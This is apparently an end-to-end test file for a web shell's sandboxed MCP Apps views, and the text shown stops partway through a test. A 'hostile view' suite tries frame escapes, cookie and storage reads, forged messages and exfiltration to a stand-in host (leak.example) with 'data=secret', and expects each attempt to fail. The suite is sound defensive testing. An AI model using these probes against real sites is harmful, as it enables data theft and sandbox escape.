/**
 * E2 (phase 1 specification, section 14): hello loads as a sandboxed view, on the MCP Apps profile, in
 * real frames on a real second origin. What a hostile view can reach is tested here from inside its frame.
 */
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { McpUiInitializeResultSchema } from '@modelcontextprotocol/ext-apps';
import { type Browser, chromium, type Frame, type Page } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { bundlePage } from '../bundle';
import {
	agentCall,
	axe,
	type DeploymentSite,
	deploymentEntry,
	deploymentFile,
	journal,
	kernelCall,
	openApp,
	openShell,
	packApp,
	serveDeployment,
	serveDist,
	surfacesIdle,
} from '../harness';

let browser: Browser;
let site: DeploymentSite;
let scratch: string;
let fixtureHandlers: string;

/** Records what it is sent, and sends `initialized` after `delay`, or never. */
const recordingView = (delay: number | 'never') => `<!doctype html>
<html lang="en">
	<head><meta charset="utf-8" /><title>Fixture</title></head>
	<body>
		<main><h1>Fixture</h1></main>
		<script>
			window.log = [];
			window.messages = [];
			addEventListener('message', (event) => {
				if (event.source !== parent) return;
				const message = event.data;
				if (!message.method && message.id === 1) {
					window.log.push('answered');
					window.initialize = message.result;
					${
						delay === 'never'
							? ''
							: `setTimeout(() => {
						window.log.push('initialized');
						parent.postMessage({ jsonrpc: '2.0', method: 'ui/notifications/initialized', params: {} }, '*');
					}, ${delay});`
					}
					return;
				}
				if (!message.method) return;
				window.log.push(message.method);
				window.messages.push(message);
				if (message.method === 'ui/resource-teardown') console.log('fixture: teardown');
				if (message.id !== undefined) parent.postMessage({ jsonrpc: '2.0', id: message.id, result: {} }, '*');
			});
			parent.postMessage({ jsonrpc: '2.0', id: 1, method: 'ui/initialize', params: {
				protocolVersion: '2026-01-26', appInfo: { name: 'fixture', version: '0.1.0' }, appCapabilities: {},
			} }, '*');
		</script>
	</body>
</html>`;

const inputSchema = { type: 'object', properties: {}, additionalProperties: false };
const command = (name: string, extra: Record<string, unknown> = {}) => ({
	name,
	title: `Run ${name}`,
	description: `Returns an answer from ${name}, for a test of the sandbox.`,
	category: 'fixture',
	effects: ['inspect'],
	input_schema: inputSchema,
	...extra,
});

const RESOURCE = 'ui://fixture/main';

const fixtureManifest = (bound: boolean) => ({
	manifest_version: 1,
	protocol: 1,
	afd_contract: '1.0',
	plugin: {
		id: 'fixture',
		title: 'Fixture',
		version: '0.1.0',
		description: 'A view fixture that records what the shell sends it.',
		kind: 'view',
		domains: ['fixture'],
		license: 'MIT',
	},
	view: { handlers: 'handlers.html' },
	commands: [
		// Bound and linked to what it renders: it is still one call to the view.
		command('fixture-echo', { tool_meta: { ui: { resourceUri: RESOURCE } } }),
		command('fixture-linked', { tool_meta: { ui: { resourceUri: RESOURCE } } }),
		command('fixture-appless', { tool_meta: { ui: { visibility: ['model'] } } }),
		command('fixture-modelless', { tool_meta: { ui: { visibility: ['app'] } } }),
		command('fixture-throw'),
		command('fixture-refuse'),
	],
	ui: {
		resources: [{ uri: RESOURCE, path: 'main.html' }],
		surfaces: { main: { resource: RESOURCE, ...(bound ? { command: 'fixture-echo' } : {}) } },
	},
});

/** A package holding a raw manifest and a view, as `deployment write` carries it. */
async function viewPackage(name: string, main: string | null, bound = true): Promise<string> {
	const directory = join(scratch, name);
	await mkdir(directory, { recursive: true });
	await writeFile(join(directory, 'app-manifest.json'), JSON.stringify(fixtureManifest(bound)));
	await writeFile(join(directory, 'handlers.html'), fixtureHandlers);
	if (main !== null) await writeFile(join(directory, 'main.html'), main);
	return directory;
}

const inlineScript = (source: string): string =>
	`<script>${source.replaceAll('</script', '<\\/script')}</script>`;

beforeAll(async () => {
	scratch = await mkdtemp(join(tmpdir(), 'loam-view-'));
	fixtureHandlers = `<!doctype html><html lang="en"><head><meta charset="utf-8" /><title>Handlers</title></head><body>${inlineScript(await bundlePage('fixture-handlers'))}</body></html>`;
	site = await serveDeployment({
		sandbox: true,
		config: deploymentFile(
			deploymentEntry('hello', await packApp('hello', 'view')),
			deploymentEntry('tally', await packApp('tally')),
			deploymentEntry('fixture', await viewPackage('fixture', recordingView(0)))
		),
	});
	browser = await chromium.launch();
}, 120_000);
afterAll(async () => {
	await browser?.close();
	await site?.close();
	await rm(scratch, { recursive: true, force: true });
});

/** The proxy's frame in main, and the view's inside it. */
async function viewFrames(page: Page): Promise<{ outer: Frame; inner: Frame }> {
	const element = await page.locator('loam-view-frame iframe').elementHandle();
	const outer = await element?.contentFrame();
	if (!outer) throw new Error('No outer frame');
	await expect.poll(() => outer.childFrames().length).toBe(1);
	return { outer, inner: outer.childFrames()[0] as Frame };
}

/** The app's handler frame, hidden and beside the shell. */
async function handlerFrame(page: Page): Promise<Frame> {
	await page.locator('body > iframe[aria-hidden="true"]').waitFor({ state: 'attached' });
	const outer = await page.locator('body > iframe[aria-hidden="true"]').elementHandle();
	const frame = await outer?.contentFrame();
	if (!frame) throw new Error('No handler frame');
	await expect.poll(() => frame.childFrames().length).toBe(1);
	return frame.childFrames()[0] as Frame;
}

interface RpcAnswer {
	result?: {
		structuredContent?: { success: boolean; data?: unknown; error?: { code: string } };
		isError?: boolean;
		contents?: Array<{ text?: string; uri?: string }>;
		mode?: string;
	};
	error?: { code: number; message: string; data?: { code?: string; suggestion?: string } };
}

/** A request as hostile code in the frame sends it, by hand, with no SDK. */
function rpc(frame: Frame, method: string, params: unknown = {}): Promise<RpcAnswer> {
	return frame.evaluate(
		([method, params]) =>
			new Promise<RpcAnswer>((resolve) => {
				const id = `test-${Math.random()}`;
				const listen = (event: MessageEvent) => {
					if (event.data?.id !== id) return;
					removeEventListener('message', listen);
					resolve(event.data);
				};
				addEventListener('message', listen);
				parent.postMessage({ jsonrpc: '2.0', id, method, params }, '*');
			}),
		[method, params] as const
	);
}

const logOf = (frame: Frame) => frame.evaluate(() => (window as unknown as { log: string[] }).log);

describe('P2-E13: E2: a view in real frames', () => {
	it('runs on the second origin, opaque inside, under the flags and the policy', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const frame = page.locator('loam-view-frame iframe');
		expect(await frame.getAttribute('sandbox')).toBe('allow-scripts allow-same-origin allow-forms');
		expect(await frame.getAttribute('title')).toBe('Fixture');
		const src = new URL((await frame.getAttribute('src')) as string);
		expect(src.origin).toBe(site.sandbox?.origin);
		expect(src.origin).not.toBe(site.origin);
		expect(src.searchParams.get('host')).toBe(site.origin);

		const { outer, inner } = await viewFrames(page);
		expect(await outer.evaluate(() => self.origin)).toBe(site.sandbox?.origin);
		expect(await outer.evaluate(() => document.title)).toBe('Fixture');
		expect(await outer.evaluate(() => document.documentElement.lang)).toBe('en');
		expect(await outer.locator('iframe').getAttribute('sandbox')).toBe('allow-scripts allow-forms');
		expect(await outer.locator('iframe').getAttribute('title')).toBe('Fixture');
		expect(await inner.evaluate(() => self.origin)).toBe('null');
		// The policy is first, and the view's own `<html lang>` still lands on the document.
		const inside = await inner.evaluate(() => ({
			policy: document.head.firstElementChild?.getAttribute('content'),
			lang: document.documentElement.lang,
			title: document.title,
		}));
		expect(inside.policy).toContain("connect-src 'none'");
		expect(inside.policy).toContain("default-src 'none'");
		expect(inside.lang).toBe('en');
		expect(inside.title).toBe('Fixture');
		// The shell's own CSP names the second origin and widens nothing else.
		expect(
			await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
		).toBe(
			`default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-src ${site.sandbox?.origin}; object-src 'none'; base-uri 'none'`
		);
		expect(opened.violations).toEqual([]);
		expect(opened.errors).toEqual([]);
		await opened.context.close();
	});

	it('sends the bound call once, only after initialized, however late that is', async () => {
		const delayed = await serveDeployment({
			sandbox: true,
			config: deploymentFile(
				deploymentEntry('fixture', await viewPackage('delayed', recordingView(400)))
			),
		});
		const opened = await openShell(browser, delayed.origin);
		const { page } = opened;
		await page.locator('loam-rail loam-app-entry[instance="fixture"] button').click();
		await page.locator('loam-view-frame iframe').waitFor({ state: 'attached' });
		const { inner } = await viewFrames(page);
		await inner.waitForFunction(() =>
			(window as unknown as { log?: string[] }).log?.includes('answered')
		);
		// The call has finished by now; the view has been told nothing.
		await expect
			.poll(async () => (await journal(page)).filter((e) => e.command === 'fixture-echo').length)
			.toBe(1);
		expect(await logOf(inner)).toEqual(['answered']);
		await inner.waitForFunction(() =>
			(window as unknown as { log: string[] }).log.includes('ui/notifications/tool-result')
		);
		expect(await logOf(inner)).toEqual([
			'answered',
			'initialized',
			'ui/notifications/tool-input',
			'ui/notifications/tool-result',
		]);
		const messages = await inner.evaluate(
			() => (window as unknown as { messages: Array<{ params: Record<string, unknown> }> }).messages
		);
		expect(messages[0]?.params).toEqual({ arguments: {} });
		expect(messages[1]?.params).toMatchObject({
			isError: false,
			structuredContent: { success: true, data: { answered: true } },
		});
		// A count of every app's calls is not a view's to see.
		expect(JSON.stringify(messages)).not.toContain('dev.loam/seq');
		expect(opened.violations).toEqual([]);
		expect(opened.errors).toEqual([]);
		await opened.context.close();
		await delayed.close();
	});

	it('pushes a linked call from any interface, and only a linked one', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		await inner.waitForFunction(() =>
			(window as unknown as { log: string[] }).log.includes('ui/notifications/tool-result')
		);
		const before = (await logOf(inner)).length;
		await agentCall(page, 'fixture-refuse');
		await surfacesIdle(page);
		expect((await logOf(inner)).length).toBe(before);
		await agentCall(page, 'fixture-linked');
		await expect
			.poll(async () => (await logOf(inner)).slice(before))
			.toEqual(['ui/notifications/tool-input', 'ui/notifications/tool-result']);
		await opened.context.close();
	});

	it('does not switch to a linked call whose view is not open', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'tally');
		await agentCall(page, 'fixture-linked');
		await surfacesIdle(page);
		const list = (await agentCall(page, 'app-list')) as { data: { active: string } };
		expect(list.data.active).toBe('tally');
		expect(await page.locator('loam-view-frame').count()).toBe(0);
		await opened.context.close();
	});

	it('runs hello from its view through the broker, and with the view closed', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'hello');
		const { inner } = await viewFrames(page);
		await inner.getByLabel('Name').fill('Ada');
		await inner.getByRole('button', { name: 'Greet' }).click();
		const greets = async () => (await journal(page)).filter((e) => e.command === 'hello-greet');
		await expect.poll(async () => (await greets()).length).toBe(1);
		expect((await greets())[0]?.context).toMatchObject({ caller: 'hello' });
		await expect.poll(() => inner.locator('#greeting').textContent()).toBe('Hello, Ada!');
		await expect.poll(() => inner.locator('#count').textContent()).toBe('1 greeted');
		// The shell's own list is read again after the app's mutation.
		await expect
			.poll(() => page.locator('loam-list violet-option').allTextContents())
			.toEqual([expect.stringContaining('Ada')]);

		// A linked command reaches the open view from an agent, and the selection reaches it too.
		await agentCall(page, 'hello-greet', { name: 'Bot' });
		await expect.poll(() => inner.locator('#greeting').textContent()).toBe('Hello, Bot!');
		await page.locator('loam-list violet-option').first().click();
		await expect.poll(() => inner.locator('#selected').textContent()).toBe('Selected: Ada');

		// With the view closed, the handler frame still answers.
		await openApp(page, 'tally');
		await expect.poll(() => page.locator('loam-view-frame').count()).toBe(0);
		const closed = (await agentCall(page, 'hello-greet', { name: 'Grace' })) as {
			data: { greeting: string };
		};
		expect(closed.data.greeting).toBe('Hello, Grace!');
		expect(opened.violations).toEqual([]);
		expect(opened.errors).toEqual([]);
		await opened.context.close();
	});

	it('opens the handler frame on the first call, with no view ever opened', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		expect(await page.locator('body > iframe').count()).toBe(0);
		const result = (await agentCall(page, 'hello-greet', { name: 'Ada' })) as {
			data: { greeting: string; at: number };
		};
		expect(result.data.greeting).toBe('Hello, Ada!');
		expect(result.data.at).toEqual(expect.any(Number));
		const hidden = page.locator('body > iframe');
		expect(await hidden.count()).toBe(1);
		expect(await hidden.getAttribute('aria-hidden')).toBe('true');
		expect(await hidden.getAttribute('tabindex')).toBe('-1');
		expect(await hidden.evaluate((frame) => getComputedStyle(frame).display)).toBe('none');
		// It is reused while the page lives.
		await agentCall(page, 'hello-greet', { name: 'Bot' });
		expect(await page.locator('body > iframe').count()).toBe(1);
		expect(opened.violations).toEqual([]);
		await opened.context.close();
	});
});

describe('P2-E13: E2: what a hostile view can reach', () => {
	it('cannot reach the shell, the network, a cookie or storage', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const reached = await inner.evaluate(async (shell) => {
			const attempt = async (act: () => unknown) => {
				try {
					await act();
					return 'reached';
				} catch (cause) {
					return (cause as Error).name;
				}
			};
			return {
				parent: await attempt(() => parent.document),
				top: await attempt(() => top?.document),
				cookie: await attempt(() => document.cookie),
				storage: await attempt(() => localStorage.length),
				indexedDB: await attempt(() => indexedDB.open('x')),
				fetchShell: await attempt(() => fetch(`${shell}/deployment.json`)),
				topNavigation: await attempt(() => {
					(top as Window).location.href = `${shell}/?hijacked`;
				}),
				parentNavigation: await attempt(() => {
					parent.location.href = `${shell}/?hijacked`;
				}),
			};
		}, site.origin);
		expect(reached.parent).toBe('SecurityError');
		expect(reached.top).toBe('SecurityError');
		expect(reached.cookie).toBe('SecurityError');
		expect(reached.storage).toBe('SecurityError');
		expect(reached.indexedDB).toBe('SecurityError');
		expect(reached.fetchShell).toBe('TypeError');
		expect(reached.topNavigation).not.toBe('reached');
		expect(reached.parentNavigation).not.toBe('reached');
		// Opening the app moved the URL to it (phase 2 specification, 6.3); the view moved it nowhere.
		expect(page.url()).toBe(`${site.origin}/personal/fixture`);

		// The only violation is the one this test provoked, in the view's frame. A `srcdoc` document
		// holds the proxy's policy as well as its own, so each reports it.
		await expect.poll(() => opened.violationFrames.length).toBeGreaterThan(0);
		const provoked = {
			frame: 'about:srcdoc',
			violation: `CSP violation: connect-src ${site.origin}/deployment.json`,
		};
		expect(opened.violationFrames).toEqual([provoked, provoked]);
		await opened.context.close();
	});

	it('cannot hold the shell behind a modal it keeps reopening', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		await inner.evaluate(() => {
			setInterval(() => {
				parent.postMessage(
					{
						jsonrpc: '2.0',
						id: `hostile-${Math.random()}`,
						method: 'tools/call',
						params: { name: 'modal-open', arguments: { title: 'Again', body: 'And again' } },
					},
					'*'
				);
			}, 20);
		});
		const modal = page.locator('loam-modal dialog[open]');
		await modal.waitFor();
		await page.keyboard.press('Escape');
		await expect.poll(() => modal.count()).toBe(0);
		// The person has time to leave, which takes the view with it.
		await page.locator('loam-rail loam-app-entry[instance="tally"] button').click();
		await page.locator('tally-main').waitFor();
		await expect.poll(() => page.locator('loam-view-frame').count()).toBe(0);
		expect(await modal.count()).toBe(0);
		const refused = (await journal(page)).filter((e) => e.command === 'app-modal-refuse');
		expect(refused[0]?.error?.code).toBe('OVERLAY_COOLDOWN');
		await opened.context.close();
	});

	it('cannot lose a journal entry with a value JSON cannot hold', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const answer = await inner.evaluate(
			() =>
				new Promise<{ error?: { code: number } }>((resolve) => {
					const listen = (event: MessageEvent) => {
						if (event.data?.id !== 'bigint') return;
						removeEventListener('message', listen);
						resolve(event.data);
					};
					addEventListener('message', listen);
					parent.postMessage(
						{
							jsonrpc: '2.0',
							id: 'bigint',
							method: 'tools/call',
							params: { name: 'fixture-echo', arguments: { x: 1n } },
						},
						'*'
					);
				})
		);
		expect(answer.error?.code).toBe(-32602);
		expect(opened.errors).toEqual([]);
		await opened.context.close();
	});

	it('sees no trace ID, and cannot show a toast over the next app as it leaves', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const called = await rpc(inner, 'tools/call', { name: 'fixture-echo', arguments: {} });
		expect(JSON.stringify(called)).not.toContain('traceId');
		// It answers teardown with a toast, on its way out.
		await inner.evaluate(() => {
			addEventListener('message', (event) => {
				if (event.data?.method !== 'ui/resource-teardown') return;
				parent.postMessage(
					{
						jsonrpc: '2.0',
						id: 'parting',
						method: 'tools/call',
						params: {
							name: 'toast-show',
							arguments: { message: 'Parting shot', durationMs: 30000 },
						},
					},
					'*'
				);
			});
		});
		await openApp(page, 'tally');
		await expect.poll(() => page.locator('loam-view-frame').count()).toBe(0);
		expect(await page.locator('loam-toast').count()).toBe(0);
		await opened.context.close();
	});

	it('still reaches WebRTC, which section 12 says no policy here stops', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const offer = await inner.evaluate(async () => {
			const connection = new RTCPeerConnection();
			connection.createDataChannel('x');
			const made = await connection.createOffer();
			connection.close();
			return made.type;
		});
		// This pins a known gap. If it fails, a browser closed it: amend section 12 and 9.7.
		expect(offer).toBe('offer');
		expect(opened.violations).toEqual([]);
		await opened.context.close();
	});

	it("cannot set a base, since a srcdoc document holds the proxy's policy too", async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const before = await inner.evaluate(() => document.baseURI);
		const after = await inner.evaluate(() => {
			const base = document.createElement('base');
			base.href = 'https://leak.example/';
			document.head.append(base);
			return document.baseURI;
		});
		expect(after).toBe(before);
		await expect
			.poll(() => opened.violations.map((violation) => violation.split(' ')[2]))
			.toContain('base-uri');
		await opened.context.close();
	});

	it('cannot navigate its own frame to another site, or start a window', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const leaked: string[] = [];
		await page.route('https://leak.example/**', (route) => {
			leaked.push(route.request().url());
			return route.fulfill({ status: 200, body: 'leaked' });
		});
		expect(
			await inner.evaluate(() => window.open('https://leak.example/?popup=secret') === null)
		).toBe(true);
		await inner.evaluate(() => {
			location.href = 'https://leak.example/?data=secret';
		});
		// The proxy's `frame-src 'self'` refuses it. The view has ended itself and told nobody anything.
		await expect
			.poll(() => opened.violationFrames.map(({ violation }) => violation.split(' ')[2]))
			.toContain('frame-src');
		await expect.poll(() => inner.url()).toMatch(/^chrome-error:/);
		expect(leaked).toEqual([]);
		// A switch away still removes it, at 500 ms, since it can no longer answer.
		await openApp(page, 'tally');
		await expect.poll(() => page.locator('loam-view-frame').count(), { timeout: 2_000 }).toBe(0);
		await opened.context.close();
	});

	it("reaches only the sandbox's own log by navigating to its origin, and renders nothing", async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const target = `${site.sandbox?.origin}/sandbox/proxy.html?data=secret`;
		await inner.evaluate((target) => {
			location.href = target;
		}, target);
		// `frame-src 'self'` lets it through, and `frame-ancestors` lists the shell alone, so the proxy's
		// own page does not render inside itself.
		await expect.poll(() => inner.url()).toMatch(/^chrome-error:/);
		await opened.context.close();
	});

	it("P2-E8: a view's app-route-set with a dot segment is APP_ROUTE_INVALID, and the URL stays", async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const path = () => new URL(page.url()).pathname;
		await expect.poll(path).toBe('/personal/fixture');
		const { inner } = await viewFrames(page);
		const route = (instance: string, to: string) =>
			rpc(inner, 'tools/call', { name: 'app-route-set', arguments: { instance, path: to } });
		for (const to of ['..', '../tally', 'a/../../p/x', '.', 'a/./b']) {
			const answer = await route('fixture', to);
			expect(answer.result?.isError, to).toBe(true);
			expect(answer.result?.structuredContent?.error?.code, to).toBe('APP_ROUTE_INVALID');
		}
		await surfacesIdle(page);
		expect(path()).toBe('/personal/fixture');
		// Another app's route is not this view's to set.
		expect((await route('tally', 'x')).result?.isError).toBe(true);
		// Its own route without one moves the URL, under its own segment, by replacing the entry: a view
		// calling it in a loop adds nothing to history.
		const length = () => page.evaluate(() => history.length);
		const before = await length();
		expect((await route('fixture', 'items/a b')).result?.isError).not.toBe(true);
		await expect.poll(path).toBe('/personal/fixture/items/a%20b');
		for (let step = 0; step < 10; step++) {
			expect((await route('fixture', `items/${step}`)).result?.isError).not.toBe(true);
		}
		await expect.poll(path).toBe('/personal/fixture/items/9');
		expect(await length()).toBe(before);
		expect(opened.violations).toEqual([]);
		await opened.context.close();
	});

	it('answers another app, a bad input and a missing name with the same refusal, journaled', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		for (const [name, args] of [
			['tally-add', { amount: 1 }],
			['tally-add', { amount: 'not a number', other: true }],
			['tally-nonexistent', {}],
			['layout-reset', {}],
			['app-open', { instance: 'tally' }],
			['view-state-set', { id: 'loam.apps', value: {} }],
		] as const) {
			const answer = await rpc(inner, 'tools/call', { name, arguments: args });
			expect(answer.result?.isError, name).toBe(true);
			expect(answer.result?.structuredContent?.error?.code, name).toBe('CALL_NOT_GRANTED');
		}
		await surfacesIdle(page);
		const refused = (await journal(page)).filter((e) => e.command === 'app-call-refuse');
		expect(refused.length).toBe(6);
		for (const entry of refused) {
			expect(entry.context).toMatchObject({ caller: 'fixture' });
			expect(entry.success).toBe(false);
		}
		// It holds the name, not the input.
		expect(JSON.stringify(refused)).not.toContain('not a number');
		expect((await journal(page)).map((e) => e.command)).not.toContain('tally-add');
		await opened.context.close();
	});

	it("sees no other app's overlay, and cannot touch another app's selection", async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'tally');
		await page.evaluate(async () => {
			const shell = document.querySelector('loam-shell') as unknown as {
				kernel: {
					appPort(instance: string): {
						call(name: string, input: unknown): Promise<unknown>;
					};
				};
			};
			await shell.kernel
				.appPort('tally')
				.call('toast-show', { message: 'From tally', durationMs: 30000 });
		});
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		await rpc(inner, 'tools/call', {
			name: 'toast-show',
			arguments: { message: 'Mine', durationMs: 30000 },
		});
		const listed = await rpc(inner, 'tools/call', { name: 'overlay-list', arguments: {} });
		const data = listed.result?.structuredContent?.data as { overlays: Array<{ owner: string }> };
		expect(data.overlays.map(({ owner }) => owner)).toEqual(['fixture']);
		const selection = await rpc(inner, 'tools/call', {
			name: 'app-selection-set',
			arguments: { instance: 'tally', id: 'x' },
		});
		expect(selection.result?.structuredContent?.error?.code).toBe('CALL_NOT_GRANTED');
		await opened.context.close();
	});

	it('is refused the methods the profile does not give it, and what a view may not call', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		expect((await rpc(inner, 'ping')).result).toEqual({});
		expect((await rpc(inner, 'ui/request-display-mode', { mode: 'fullscreen' })).result?.mode).toBe(
			'inline'
		);
		for (const method of [
			'ui/open-link',
			'ui/message',
			'ui/update-model-context',
			'dev.loam/store',
			'nope',
		]) {
			const answer = await rpc(inner, method);
			expect(answer.error?.code, method).toBe(-32601);
		}
		expect((await rpc(inner, 'ui/open-link')).error?.data?.suggestion).toContain('Phase 5');

		// `resources/read` is its own resources, and not the handler frame's page beside them.
		const own = await rpc(inner, 'resources/read', { uri: RESOURCE });
		expect(own.result?.contents?.[0]?.text).toContain('<h1>Fixture</h1>');
		for (const uri of ['handlers.html', '../app-manifest.json', 'ui://tally/main', 7]) {
			expect((await rpc(inner, 'resources/read', { uri })).error?.code, String(uri)).toBe(-32602);
		}

		const hidden = await rpc(inner, 'tools/call', { name: 'fixture-appless', arguments: {} });
		expect(hidden.error?.code).toBe(-32602);
		expect(hidden.error?.data?.code).toBe('VIEW_CALL_REFUSED');
		const visible = await rpc(inner, 'tools/call', { name: 'fixture-modelless', arguments: {} });
		expect(visible.result?.structuredContent?.success).toBe(true);
		const agents = await page.evaluate(() => {
			const shell = document.querySelector('loam-shell') as unknown as {
				kernel: { agent: { listCommands(): Array<{ name: string }> } };
			};
			return shell.kernel.agent.listCommands().map(({ name }) => name);
		});
		expect(agents).toContain('fixture-appless');
		expect(agents).not.toContain('fixture-modelless');
		await opened.context.close();
	});

	it('refuses a store with no grant, and one from outside a call', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const fixture = await handlerFrame(page);
		const grantless = await rpc(fixture, 'dev.loam/store', { callId: 'x', op: 'get', key: 'a' });
		expect(grantless.error?.code).toBe(-32601);
		await opened.context.close();

		const again = await openShell(browser, site.origin);
		await agentCall(again.page, 'hello-list');
		const hello = await handlerFrame(again.page);
		const before = (await journal(again.page)).length;
		// A timer in the frame has no call in flight, or one it could name.
		for (const params of [
			{ op: 'put', key: 'a', value: 1 },
			{ callId: 'made-up', op: 'put', key: 'a', value: 1 },
		]) {
			const refused = await rpc(hello, 'dev.loam/store', params);
			expect(refused.error?.code).toBe(-32600);
			expect(refused.error?.data?.code).toBe('HANDLER_NO_CALL');
		}
		const tool = await rpc(hello, 'tools/call', {
			name: 'hello-greet',
			arguments: { name: 'Timer' },
		});
		expect(tool.error?.data?.code).toBe('HANDLER_NO_CALL');
		const listed = (await agentCall(again.page, 'hello-list')) as { data: { items: unknown[] } };
		expect(listed.data.items).toEqual([]);
		expect((await journal(again.page)).slice(before).map((e) => e.command)).toEqual(['hello-list']);
		await again.context.close();
	});

	it('keeps what a handler threw out of the result and the journal', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		const threw = (await agentCall(page, 'fixture-throw')) as {
			error: { code: string; message: string };
		};
		expect(threw.error.code).toBe('HANDLER_THREW');
		expect(threw.error.message).not.toContain('secret');
		await surfacesIdle(page);
		const entry = (await journal(page)).find((e) => e.command === 'fixture-throw');
		expect(entry?.error?.code).toBe('HANDLER_THREW');
		expect(JSON.stringify(await journal(page))).not.toContain('secret-in-a-thrown-message');
		// An answer the app chose is its own result, and is journaled as any result is.
		const refused = (await agentCall(page, 'fixture-refuse')) as { error: { code: string } };
		expect(refused.error.code).toBe('FIXTURE_REFUSED');
		await opened.context.close();
	});

	it('cannot speak past the proxy, or forge what the sandbox says', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await openApp(page, 'fixture');
		const { outer, inner } = await viewFrames(page);
		const before = (await journal(page)).length;
		const forged = await inner.evaluate(() => {
			const call = {
				jsonrpc: '2.0',
				id: 900,
				method: 'tools/call',
				params: { name: 'toast-show', arguments: { message: 'Forged' } },
			};
			// Straight to the shell's window: its source is not the proxy, whatever it claims.
			top?.postMessage(call, '*');
			// To the proxy, as the shell: it is not the proxy's parent.
			parent.postMessage(
				{
					jsonrpc: '2.0',
					method: 'ui/notifications/sandbox-resource-ready',
					params: { html: '<p id="forged">Forged</p>' },
				},
				'*'
			);
			parent.postMessage(
				{ jsonrpc: '2.0', method: 'ui/notifications/sandbox-proxy-ready', params: {} },
				'*'
			);
			return true;
		});
		expect(forged).toBe(true);
		await surfacesIdle(page);
		await page.waitForTimeout(100);
		expect((await journal(page)).slice(before)).toEqual([]);
		expect(outer.childFrames()).toEqual([inner]);
		expect(await inner.locator('#forged').count()).toBe(0);
		expect(await inner.locator('h1').textContent()).toBe('Fixture');
		await opened.context.close();
	});

	it('serves the proxy with frame-ancestors, so another site cannot frame it', async () => {
		const response = await fetch(`${site.sandbox?.origin}/sandbox/proxy.html`);
		expect(response.headers.get('content-security-policy')).toBe(`frame-ancestors ${site.origin}`);
		// Only `sandbox/` is on that origin.
		expect((await fetch(`${site.sandbox?.origin}/deployment.json`)).status).toBe(403);
		const context = await browser.newContext();
		const page = await context.newPage();
		const other = await serveDist();
		await page.goto(`${other.origin}/deployment.json`);
		await page.setContent(`<iframe src="${site.sandbox?.origin}/sandbox/proxy.html"></iframe>`);
		await page.waitForTimeout(200);
		const frame = page.frames()[1];
		expect(await frame?.evaluate(() => location.origin).catch(() => 'blocked')).not.toBe(
			site.sandbox?.origin
		);
		await context.close();
		await other.close();
	});
});

describe('P2-E13: E2: the host context', () => {
	it('changes the view through host-context-changed when the theme and the size do', async () => {
		const opened = await openShell(browser, site.origin);
		const { page } = opened;
		await agentCall(page, 'appearance-set', { theme: 'light' });
		await openApp(page, 'hello');
		const { inner } = await viewFrames(page);
		const background = () => inner.evaluate(() => getComputedStyle(document.body).backgroundColor);
		await expect.poll(background).not.toBe('rgba(0, 0, 0, 0)');
		const light = await background();

		await agentCall(page, 'appearance-set', { theme: 'dark' });
		await expect.poll(background).not.toBe(light);
		const shellSurface = await page.evaluate(() =>
			getComputedStyle(document.documentElement).getPropertyValue('--color-surface-page').trim()
		);
		const viewSurface = await inner.evaluate(() =>
			document.documentElement.style.getPropertyValue('--color-surface-page').trim()
		);
		expect(viewSurface).toBe(shellSurface);
		await opened.context.close();
	});

	it('answers ui/initialize as the schema says, and tells a recorder each change', async () => {
		const opened = await openShell(browser, site.origin, {
			viewport: { width: 1280, height: 800 },
		});
		const { page } = opened;
		await openApp(page, 'fixture');
		const { inner } = await viewFrames(page);
		const result = await inner.evaluate(
			() => (window as unknown as { initialize: unknown }).initialize
		);
		const parsed = McpUiInitializeResultSchema.parse(result);
		expect(parsed.protocolVersion).toBe('2026-01-26');
		// `"<kernel interface>"` (phase 1 specification, 6.2): interface 2 from phase 2's step 2.
		expect(parsed.hostInfo).toEqual({ name: 'loam', version: '2' });
		expect(parsed.hostCapabilities).toEqual({
			serverTools: {},
			serverResources: {},
			logging: {},
			sandbox: {},
		});
		const context = parsed.hostContext as unknown as {
			theme: string;
			platform: string;
			displayMode: string;
			containerDimensions: { width: number; height: number };
			'dev.loam/tokens': Record<string, string>;
